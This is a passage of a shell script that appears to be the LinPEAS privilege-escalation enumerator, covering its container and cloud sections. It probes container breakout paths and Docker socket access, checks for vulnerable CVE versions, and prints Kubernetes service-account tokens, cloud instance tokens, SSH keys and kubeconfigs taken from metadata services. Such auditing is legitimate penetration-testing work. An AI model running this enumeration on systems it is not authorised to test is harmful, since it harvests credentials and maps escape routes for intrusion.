    for int_sock in $(find / ! -path "/sys/*" -type s -name "docker.sock" -o -name "docker.socket" -o -name "dockershim.sock" -o -name "containerd.sock" -o -name "crio.sock" -o -name "frakti.sock" -o -name "rktlet.sock" 2>/dev/null); do
      if ! [ "$IAMROOT" ] && [ -w "$int_sock" ]; then
        if echo "$int_sock" | grep -Eq "docker"; then
          dock_sock="$int_sock"
          echo "You have write permissions over Docker socket $dock_sock" | sed -${E} "s,$dock_sock,${SED_RED_YELLOW},g"
          echo "Docker enummeration:"
          docker_enumerated=""

          if [ "$(command -v curl)" ]; then
            sockInfoResponse="$(curl -s --unix-socket $dock_sock http://localhost/info)"
            dockerVersion=$(echo "$sockInfoResponse" | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
            echo $sockInfoResponse | tr ',' '\n' | grep -E "$GREP_DOCKER_SOCK_INFOS" | grep -v "$GREP_DOCKER_SOCK_INFOS_IGNORE" | tr -d '"'
            if [ "$sockInfoResponse" ]; then docker_enumerated="1"; fi
          fi

          if [ "$(command -v docker)" ] && ! [ "$docker_enumerated" ]; then
            sockInfoResponse="$(docker info)"
            dockerVersion=$(echo "$sockInfoResponse" | tr ',' '\n' | grep 'Server Version' | cut -d' ' -f 4)
            printf "$sockInfoResponse" | tr ',' '\n' | grep -E "$GREP_DOCKER_SOCK_INFOS" | grep -v "$GREP_DOCKER_SOCK_INFOS_IGNORE" | tr -d '"'
          fi
        
        else
          echo "You have write permissions over interesting socket $int_sock" | sed -${E} "s,$int_sock,${SED_RED},g"
        fi

      else
        echo "You don't have write permissions over interesting socket $int_sock" | sed -${E} "s,$int_sock,${SED_GREEN},g"
      fi
    done
  fi
}

checkDockerVersionExploits() {
  if echo "$dockerVersion" | grep -iq "not found"; then
    VULN_CVE_2019_13139="$(echo_not_found)"
    VULN_CVE_2019_5736="$(echo_not_found)"
    return
  fi

  VULN_CVE_2019_13139="$(echo_no)"
  if [ "$(echo $dockerVersion | sed 's,\.,,g')" -lt "1895" ]; then
    VULN_CVE_2019_13139="Yes"
  fi

  VULN_CVE_2019_5736="$(echo_no)"
  if [ "$(echo $dockerVersion | sed 's,\.,,g')" -lt "1893" ]; then
    VULN_CVE_2019_5736="Yes"
  fi
}

checkContainerExploits() {
  VULN_CVE_2019_5021="$(echo_no)"
  if [ -f "/etc/alpine-release" ]; then
    alpineVersion=$(cat /etc/alpine-release)
    if [ "$(echo $alpineVersion | sed 's,\.,,g')" -ge "330" ] && [ "$(echo $alpineVersion | sed 's,\.,,g')" -le "360" ]; then
      VULN_CVE_2019_5021="Yes"
    fi
  fi
}

checkCreateReleaseAgent(){
  cat /proc/$$/cgroup 2>/dev/null | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$' | while read -r subsys
  do
      if unshare -UrmC --propagation=unchanged bash -c "mount -t cgroup -o $subsys cgroup /tmp/cgroup_3628d4 2>&1 >/dev/null && test -w /tmp/cgroup_3628d4/release_agent" >/dev/null 2>&1 ; then
          release_agent_breakout2="Yes (unshare with $subsys)";
          rm -rf /tmp/cgroup_3628d4
          break
      fi
  done
}

checkProcSysBreakouts(){
  dev_mounted="No"
  if [ $(ls -l /dev | grep -E "^c" | wc -l) -gt 50 ]; then
    dev_mounted="Yes";
  fi

  proc_mounted="No"
  if [ $(ls /proc | grep -E "^[0-9]" | wc -l) -gt 50 ]; then
    proc_mounted="Yes";
  fi

  run_unshare=$(unshare -UrmC bash -c 'echo -n Yes' 2>/dev/null)
  if ! [ "$run_unshare" = "Yes" ]; then
    run_unshare="No"
  fi

  if [ "$(ls -l /sys/fs/cgroup/*/release_agent 2>/dev/null)" ]; then 
    release_agent_breakout1="Yes"
  else 
    release_agent_breakout1="No"
  fi
  
  release_agent_breakout2="No"
  mkdir /tmp/cgroup_3628d4
  mount -t cgroup -o memory cgroup /tmp/cgroup_3628d4 2>/dev/null
  if [ $? -eq 0 ]; then 
    release_agent_breakout2="Yes"; 
    rm -rf /tmp/cgroup_3628d4
  else 
    mount -t cgroup -o rdma cgroup /tmp/cgroup_3628d4 2>/dev/null
    if [ $? -eq 0 ]; then 
      release_agent_breakout2="Yes"; 
      rm -rf /tmp/cgroup_3628d4
    else 
      checkCreateReleaseAgent
    fi
  fi
  rm -rf /tmp/cgroup_3628d4 2>/dev/null
  
  core_pattern_breakout="$( (echo -n '' > /proc/sys/kernel/core_pattern && echo Yes) 2>/dev/null || echo No)"
  modprobe_present="$(ls -l `cat /proc/sys/kernel/modprobe` 2>/dev/null || echo No)"
  panic_on_oom_dos="$( (echo -n '' > /proc/sys/vm/panic_on_oom && echo Yes) 2>/dev/null || echo No)"
  panic_sys_fs_dos="$( (echo -n '' > /proc/sys/fs/suid_dumpable && echo Yes) 2>/dev/null || echo No)"
  binfmt_misc_breakout="$( (echo -n '' > /proc/sys/fs/binfmt_misc/register && echo Yes) 2>/dev/null || echo No)"
  proc_configgz_readable="$([ -r '/proc/config.gz' ] 2>/dev/null && echo Yes || echo No)"
  sysreq_trigger_dos="$( (echo -n '' > /proc/sysrq-trigger && echo Yes) 2>/dev/null || echo No)"
  kmsg_readable="$( (dmesg > /dev/null 2>&1 && echo Yes) 2>/dev/null || echo No)"  # Kernel Exploit Dev
  kallsyms_readable="$( (head -n 1 /proc/kallsyms > /dev/null && echo Yes )2>/dev/null || echo No)" # Kernel Exploit Dev
  mem_readable="$( (head -n 1 /proc/self/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  if [ "$(head -n 1 /tmp/kcore 2>/dev/null)" ]; then kcore_readable="Yes"; else kcore_readable="No"; fi
  kmem_readable="$( (head -n 1 /proc/kmem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  kmem_writable="$( (echo -n '' > /proc/kmem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  mem_readable="$( (head -n 1 /proc/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  mem_writable="$( (echo -n '' > /proc/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  sched_debug_readable="$( (head -n 1 /proc/sched_debug > /dev/null && echo Yes) 2>/dev/null || echo No)"
  mountinfo_readable="$( (head -n 1 /proc/*/mountinfo > /dev/null && echo Yes) 2>/dev/null || echo No)"
  uevent_helper_breakout="$( (echo -n '' > /sys/kernel/uevent_helper && echo Yes) 2>/dev/null || echo No)"
  vmcoreinfo_readable="$( (head -n 1 /sys/kernel/vmcoreinfo > /dev/null && echo Yes) 2>/dev/null || echo No)"
  security_present="$( (ls -l /sys/kernel/security > /dev/null && echo Yes) 2>/dev/null || echo No)"
  security_writable="$( (echo -n '' > /sys/kernel/security/a && echo Yes) 2>/dev/null || echo No)"
  efi_vars_writable="$( (echo -n '' > /sys/firmware/efi/vars && echo Yes) 2>/dev/null || echo No)"
  efi_efivars_writable="$( (echo -n '' > /sys/firmware/efi/efivars && echo Yes) 2>/dev/null || echo No)"
}


##############################################
#---------------) Containers (---------------#
##############################################
containerCheck

print_2title "Container related tools present (if any):"
command -v docker 
command -v lxc 
command -v rkt 
command -v kubectl
command -v podman
command -v runc

if [ "$$FAT_LINPEAS_AMICONTAINED" ]; then
  print_2title "Am I Containered?"
  execBin "AmIContainered" "https://github.com/genuinetools/amicontained" "$FAT_LINPEAS_AMICONTAINED"
fi

print_2title "Container details"
print_list "Is this a container? ...........$NC $containerType"

print_list "Any running containers? ........ "$NC
# Get counts of running containers for each platform
dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
podmancontainers=$(podman ps --format "{{.Names}}" 2>/dev/null | wc -l)
lxccontainers=$(lxc list -c n --format csv 2>/dev/null | wc -l)
rktcontainers=$(rkt list 2>/dev/null | tail -n +2  | wc -l)
if [ "$dockercontainers" -eq "0" ] && [ "$lxccontainers" -eq "0" ] && [ "$rktcontainers" -eq "0" ] && [ "$podmancontainers" -eq "0" ]; then
    echo_no
else
    containerCounts=""
    if [ "$dockercontainers" -ne "0" ]; then containerCounts="${containerCounts}docker($dockercontainers) "; fi
    if [ "$podmancontainers" -ne "0" ]; then containerCounts="${containerCounts}podman($podmancontainers) "; fi
    if [ "$lxccontainers" -ne "0" ]; then containerCounts="${containerCounts}lxc($lxccontainers) "; fi
    if [ "$rktcontainers" -ne "0" ]; then containerCounts="${containerCounts}rkt($rktcontainers) "; fi
    echo "Yes $containerCounts" | sed -${E} "s,.*,${SED_RED},"
    
    # List any running containers
    if [ "$dockercontainers" -ne "0" ]; then echo "Running Docker Containers" | sed -${E} "s,.*,${SED_RED},"; docker ps | tail -n +2 2>/dev/null; echo ""; fi
    if [ "$podmancontainers" -ne "0" ]; then echo "Running Podman Containers" | sed -${E} "s,.*,${SED_RED},"; podman ps | tail -n +2 2>/dev/null; echo ""; fi
    if [ "$lxccontainers" -ne "0" ]; then echo "Running LXC Containers" | sed -${E} "s,.*,${SED_RED},"; lxc list 2>/dev/null; echo ""; fi
    if [ "$rktcontainers" -ne "0" ]; then echo "Running RKT Containers" | sed -${E} "s,.*,${SED_RED},"; rkt list 2>/dev/null; echo ""; fi
fi

# If docker
if echo "$containerType" | grep -qi "docker"; then
    print_2title "Docker Container details"
    inDockerGroup
    print_list "Am I inside Docker group .......$NC $DOCKER_GROUP\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "Looking and enumerating Docker Sockets (if any):\n"$NC
    enumerateDockerSockets
    print_list "Docker version .................$NC$dockerVersion"
    checkDockerVersionExploits
    print_list "Vulnerable to CVE-2019-5736 ....$NC$VULN_CVE_2019_5736"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "Vulnerable to CVE-2019-13139 ...$NC$VULN_CVE_2019_13139"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    if [ "$inContainer" ]; then
        checkDockerRootless
        print_list "Rootless Docker? ............... $DOCKER_ROOTLESS\n"$NC | sed -${E} "s,No,${SED_RED}," | sed -${E} "s,Yes,${SED_GREEN},"
        echo ""
    fi
    if df -h | grep docker; then
        print_2title "Docker Overlays"
        df -h | grep docker
    fi
fi

# If token secrets mounted
if [ "$(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p')" ]; then
  print_2title "Listing mounted tokens"
  print_info "https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/attacking-kubernetes-from-inside-a-pod"
  ALREADY="IinItialVaaluE"
  for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
      TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
      if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
          ALREADY="$ALREADY|$TOKEN"
          echo "Directory: $i"
          echo "Namespace: $(cat $i)"
          echo ""
          echo $TOKEN
          echo "================================================================================"
          echo ""
      fi
  done
fi

if [ "$inContainer" ]; then
    echo ""
    print_2title "Container & breakout enumeration"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout"
    print_list "Container ID ...................$NC $(cat /etc/hostname && echo -n '\n')"
    if [ -f "/proc/1/cpuset" ] && echo "$containerType" | grep -qi "docker"; then
        print_list "Container Full ID ..............$NC $(basename $(cat /proc/1/cpuset))\n"
    fi
    print_list "Seccomp enabled? ............... "$NC
    ([ "$(grep Seccomp /proc/self/status | grep -v 0)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"

    print_list "AppArmor profile? .............. "$NC
    (cat /proc/self/attr/current 2>/dev/null || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,kernel,${SED_GREEN},"

    print_list "User proc namespace? ........... "$NC
    if [ "$(cat /proc/self/uid_map 2>/dev/null)" ]; then (printf "enabled"; cat /proc/self/uid_map) | sed "s,enabled,${SED_GREEN},"; else echo "disabled" | sed "s,disabled,${SED_RED},"; fi

    checkContainerExploits
    print_list "Vulnerable to CVE-2019-5021 .... $VULN_CVE_2019_5021\n"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"

    print_3title "Breakout via mounts"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts"
    
    checkProcSysBreakouts
    print_list "/proc mounted? ................. $proc_mounted\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "/dev mounted? .................. $dev_mounted\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "Run ushare ..................... $run_unshare\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "release_agent breakout 1........ $release_agent_breakout1\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "release_agent breakout 2........ $release_agent_breakout2\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "core_pattern breakout .......... $core_pattern_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "binfmt_misc breakout ........... $binfmt_misc_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "uevent_helper breakout ......... $uevent_helper_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "is modprobe present ............ $modprobe_present\n" | sed -${E} "s,/.*,${SED_RED},"
    print_list "DoS via panic_on_oom ........... $panic_on_oom_dos\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "DoS via panic_sys_fs ........... $panic_sys_fs_dos\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "DoS via sysreq_trigger_dos ..... $sysreq_trigger_dos\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "/proc/config.gz readable ....... $proc_configgz_readable\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "/proc/sched_debug readable ..... $sched_debug_readable\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "/proc/*/mountinfo readable ..... $mountinfo_readable\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "/sys/kernel/security present ... $security_present\n" | sed -${E} "s,Yes,${SED_RED},"
    print_list "/sys/kernel/security writable .. $security_writable\n" | sed -${E} "s,Yes,${SED_RED},"
    if [ "$EXTRA_CHECKS" ]; then
      print_list "/proc/kmsg readable ............ $kmsg_readable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/proc/kallsyms readable ........ $kallsyms_readable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/proc/self/mem readable ........ $sched_debug_readable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/proc/kcore readable ........... $kcore_readable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/proc/kmem readable ............ $kmem_readable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/proc/kmem writable ............ $kmem_writable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/proc/mem readable ............. $mem_readable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/proc/mem writable ............. $mem_writable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/sys/kernel/vmcoreinfo readable  $vmcoreinfo_readable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/sys/firmware/efi/vars writable  $efi_vars_writable\n" | sed -${E} "s,Yes,${SED_RED},"
      print_list "/sys/firmware/efi/efivars writable $efi_efivars_writable\n" | sed -${E} "s,Yes,${SED_RED},"
    fi
    
    echo ""
    print_3title "Namespaces"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces"
    ls -l /proc/self/ns/

    if echo "$containerType" | grep -qi "kubernetes"; then
        print_list "Kubernetes namespace ...........$NC $(cat /run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/namespace /secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)\n"
        print_list "Kubernetes token ...............$NC $(cat /run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/token /secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\n"
        echo ""
        
        print_2title "Kubernetes Information"
        print_info "https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/attacking-kubernetes-from-inside-a-pod"
        
        
        print_3title "Kubernetes service account folder"
        ls -lR /run/secrets/kubernetes.io/ /var/run/secrets/kubernetes.io/ /secrets/kubernetes.io/ 2>/dev/null
        echo ""
        
        print_3title "Kubernetes env vars"
        (env | set) | grep -Ei "kubernetes|kube" | grep -Ev "^WF=|^Wfolders=|^mounted=|^USEFUL_SOFTWARE='|^INT_HIDDEN_FILES=|^containerType="
        echo ""

        print_3title "Current sa user k8s permissions"
        print_info "https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes"
        kubectl auth can-i --list 2>/dev/null || curl -s -k -d "$(echo \"eyJraW5kIjoiU2VsZlN1YmplY3RSdWxlc1JldmlldyIsImFwaVZlcnNpb24iOiJhdXRob3JpemF0aW9uLms4cy5pby92MSIsIm1ldGFkYXRhIjp7ImNyZWF0aW9uVGltZXN0YW1wIjpudWxsfSwic3BlYyI6eyJuYW1lc3BhY2UiOiJlZXZlZSJ9LCJzdGF0dXMiOnsicmVzb3VyY2VSdWxlcyI6bnVsbCwibm9uUmVzb3VyY2VSdWxlcyI6bnVsbCwiaW5jb21wbGV0ZSI6ZmFsc2V9fQo=\"|base64 -d)" \
          "https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
            -X 'POST' -H 'Content-Type: application/json' \
            --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | sed "s,secrets|exec|create|patch|impersonate|\"*\",${SED_RED},"

    fi
    echo ""

    print_2title "Container Capabilities"
    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape"
    if [ "$(command -v capsh)" ]; then 
      capsh --print 2>/dev/null | sed -${E} "s,$containercapsB,${SED_RED},g"
    else
      defautl_docker_caps="00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap"
      cat /proc/self/status | tr '\t' ' ' | grep Cap | sed -${E} "s, .*,${SED_RED},g" | sed -${E} "s/00000000a80425fb/$defautl_docker_caps/g" | sed -${E} "s,0000000000000000|00000000a80425fb,${SED_GREEN},g"
      echo $ITALIC"Run capsh --decode=<hex> to decode the capabilities"$NC
    fi
    echo ""

    print_2title "Privilege Mode"
    if [ -x "$(command -v fdisk)" ]; then
        if [ "$(fdisk -l 2>/dev/null | wc -l)" -gt 0 ]; then
            echo "Privilege Mode is enabled"| sed -${E} "s,enabled,${SED_RED_YELLOW},"
        else
            echo "Privilege Mode is disabled"| sed -${E} "s,disabled,${SED_GREEN},"
        fi
    else
        echo_not_found
    fi
    echo ""

    print_2title "Interesting Files Mounted"
    (mount -l || cat /proc/self/mountinfo || cat /proc/1/mountinfo || cat /proc/mounts || cat /proc/self/mounts || cat /proc/1/mounts )2>/dev/null | grep -Ev "$GREP_IGNORE_MOUNTS" | sed -${E} "s,.sock,${SED_RED}," | sed -${E} "s,docker.sock,${SED_RED_YELLOW}," | sed -${E} "s,/dev/,${SED_RED},g"
    echo ""

    print_2title "Possible Entrypoints"
    ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null | sort | uniq
    echo ""
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q cloud; then
print_title "Cloud"
###########################################
#-----------) Cloud functions (-----------#
###########################################

GCP_GOOD_SCOPES="/devstorage.read_only|/logging.write|/monitoring|/servicecontrol|/service.management.readonly|/trace.append"
GCP_BAD_SCOPES="/cloud-platform|/compute"

exec_with_jq(){
  if [ "$(command -v jq)" ]; then 
    $@ | jq 2>/dev/null;
    if ! [ $? -eq 0 ]; then
      $@;
    fi
   else 
    $@;
   fi
}

check_gcp(){
  is_gcp="No"
  if grep -q metadata.google.internal /etc/hosts 2>/dev/null || (curl --connect-timeout 2 metadata.google.internal >/dev/null 2>&1 && [ "$?" -eq "0" ]) || (wget --timeout 2 --tries 1 metadata.google.internal >/dev/null 2>&1 && [ "$?" -eq "0" ]); then
    is_gcp="Yes"
  fi
}

check_do(){
  is_do="No"
  if [ -f "/etc/cloud/cloud.cfg.d/90-digitalocean.cfg" ]; then
    is_do="Yes"
  fi
}

check_ibm_vm(){
  is_ibm_vm="No"
  if grep -q "nameserver 161.26.0.10" "/etc/resolv.conf" && grep -q "nameserver 161.26.0.11" "/etc/resolv.conf"; then
    curl --connect-timeout 2  "http://169.254.169.254" > /dev/null 2>&1 || wget --timeout 2 --tries 1  "http://169.254.169.254" > /dev/null 2>&1
    if [ "$?" -eq 0 ]; then
      IBM_TOKEN=$( ( curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01" -H "Metadata-Flavor: ibm" -H "Accept: application/json" 2> /dev/null | cut -d '"' -f4 ) || ( wget --tries 1 -O - --method PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01" --header "Metadata-Flavor: ibm" --header "Accept: application/json" 2>/dev/null | cut -d '"' -f4 ) )
      is_ibm_vm="Yes"
    fi
  fi
}

check_aws_ecs(){
  is_aws_ecs="No"
  if (env | grep -q ECS_CONTAINER_METADATA_URI_v4); then
    is_aws_ecs="Yes";
    aws_ecs_metadata_uri=$ECS_CONTAINER_METADATA_URI_v4;
    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  
  elif (env | grep -q ECS_CONTAINER_METADATA_URI); then
    is_aws_ecs="Yes";
    aws_ecs_metadata_uri=$ECS_CONTAINER_METADATA_URI;
    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  
  elif (env | grep -q AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); then
    is_aws_ecs="Yes";
  fi
  
  if [ "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  fi
}

check_aws_ec2(){
  is_aws_ec2="No"
  is_aws_ec2_beanstalk="No"

  if [ -d "/var/log/amazon/" ]; then
    is_aws_ec2="Yes"
    EC2_TOKEN=$(curl --connect-timeout 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget --timeout 2 --tries 1 -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)

  else
    EC2_TOKEN=$(curl --connect-timeout 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget --timeout 2 --tries 1 -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
    if [ "$(echo $EC2_TOKEN | cut -c1-2)" = "AQ" ]; then
      is_aws_ec2="Yes"
    fi
  fi
  
  if [ "$is_aws_ec2" = "Yes" ] && grep -iq "Beanstalk" "/etc/motd"; then
    is_aws_ec2_beanstalk="Yes"
  fi
}

check_aws_lambda(){
  is_aws_lambda="No"

  if (env | grep -q AWS_LAMBDA_); then
    is_aws_lambda="Yes"
  fi
}

check_aws_codebuild(){
  is_aws_codebuild="No"

  if [ -f "/codebuild/output/tmp/env.sh" ] && grep -q "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" "/codebuild/output/tmp/env.sh" ; then
    is_aws_codebuild="Yes"
  fi
}

check_az_vm(){
  is_az_vm="No"

  if [ -d "/var/log/azure/" ]; then
    is_az_vm="Yes"
  
  elif cat /etc/resolv.conf 2>/dev/null | grep -q "search reddog.microsoft.com"; then
    is_az_vm="Yes"
  fi
}

check_az_app(){
  is_az_app="No"

  if [ -d "/opt/microsoft" ] && env | grep -q "IDENTITY_ENDPOINT"; then
    is_az_app="Yes"
  fi
}


check_gcp
print_list "Google Cloud Platform? ............... $is_gcp\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_aws_ecs
print_list "AWS ECS? ............................. $is_aws_ecs\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_aws_ec2
print_list "AWS EC2? ............................. $is_aws_ec2\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
print_list "AWS EC2 Beanstalk? ................... $is_aws_ec2_beanstalk\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_aws_lambda
print_list "AWS Lambda? .......................... $is_aws_lambda\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_aws_codebuild
print_list "AWS Codebuild? ....................... $is_aws_codebuild\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_do
print_list "DO Droplet? .......................... $is_do\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_ibm_vm
print_list "IBM Cloud VM? ........................ $is_ibm_vm\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_az_vm
print_list "Azure VM? ............................ $is_az_vm\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_az_app
print_list "Azure APP? ........................... $is_az_app\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"

echo ""

if [ "$is_gcp" = "Yes" ]; then
    gcp_req=""
    if [ "$(command -v curl)" ]; then
        gcp_req='curl -s -f  -H "X-Google-Metadata-Request: True"'
    elif [ "$(command -v wget)" ]; then
        gcp_req='wget -q -O - --header "X-Google-Metadata-Request: True"'
    else 
        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
    fi

    # GCP Enumeration
    if [ "$gcp_req" ]; then
        print_2title "Google Cloud Platform Enumeration"
        print_info "https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security"

        ## GC Project Info
        p_id=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/project-id')
        [ "$p_id" ] && echo "Project-ID: $p_id"
        p_num=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id')
        [ "$p_num" ] && echo "Project Number: $p_num"
        pssh_k=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys')
        [ "$pssh_k" ] && echo "Project SSH-Keys: $pssh_k"
        p_attrs=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true')
        [ "$p_attrs" ] && echo "All Project Attributes: $p_attrs"

        # OSLogin Info
        osl_u=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/users)
        [ "$osl_u" ] && echo "OSLogin users: $osl_u"
        osl_g=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/groups)
        [ "$osl_g" ] && echo "OSLogin Groups: $osl_g"
        osl_sk=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/security-keys)
        [ "$osl_sk" ] && echo "OSLogin Security Keys: $osl_sk"
        osl_au=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/authorize)
        [ "$osl_au" ] && echo "OSLogin Authorize: $osl_au"

        # Instance Info
        inst_d=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/description)
        [ "$inst_d" ] && echo "Instance Description: "
        inst_hostn=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/hostname)
        [ "$inst_hostn" ] && echo "Hostname: $inst_hostn"
        inst_id=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/id)
        [ "$inst_id" ] && echo "Instance ID: $inst_id"
        inst_img=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/image)
        [ "$inst_img" ] && echo "Instance Image: $inst_img"
        inst_mt=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/machine-type)
        [ "$inst_mt" ] && echo "Machine Type: $inst_mt"
        inst_n=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/name)
        [ "$inst_n" ] && echo "Instance Name: $inst_n"
        inst_tag=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/scheduling/tags)
        [ "$inst_tag" ] && echo "Instance tags: $inst_tag"
        inst_zone=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/zone)
        [ "$inst_zone" ] && echo "Zone: $inst_zone"

        inst_k8s_loc=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-location")
        [ "$inst_k8s_loc" ] && echo "K8s Cluster Location: $inst_k8s_loc"
        inst_k8s_name=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name")
        [ "$inst_k8s_name" ] && echo "K8s Cluster name: $inst_k8s_name"
        inst_k8s_osl_e=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/enable-oslogin")
        [ "$inst_k8s_osl_e" ] && echo "K8s OSLoging enabled: $inst_k8s_osl_e"
        inst_k8s_klab=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-labels")
        [ "$inst_k8s_klab" ] && echo "K8s Kube-labels: $inst_k8s_klab"
        inst_k8s_kubec=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kubeconfig")
        [ "$inst_k8s_kubec" ] && echo "K8s Kubeconfig: $inst_k8s_kubec"
